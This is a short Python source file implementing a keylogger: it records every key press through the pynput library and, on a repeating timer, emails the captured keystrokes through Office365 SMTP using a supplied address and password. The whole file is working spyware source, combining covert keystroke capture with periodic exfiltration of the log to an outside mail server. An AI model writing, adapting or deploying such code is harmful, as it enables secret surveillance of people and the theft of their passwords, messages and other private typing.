#!/usr/bin/env python

import pynput.keyboard
import threading
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


class Keylogger:
    def __init__(self, interval, email, password):
        self.log = "Keylogger started..."
        self.interval = interval #this sets the frequency with which emails will be sent
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.shift:
                current_key = ""
            elif key == key.backspace:
                current_key = " "
            elif key == key.enter:
                current_key = '\n'
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    #create report using timer on new thread
    def report(self):
        # print(self.log)
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        server = smtplib.SMTP("smtp.office365.com: 587")
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
    

    def start(self):
        #create keyboard instance of listener object
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()






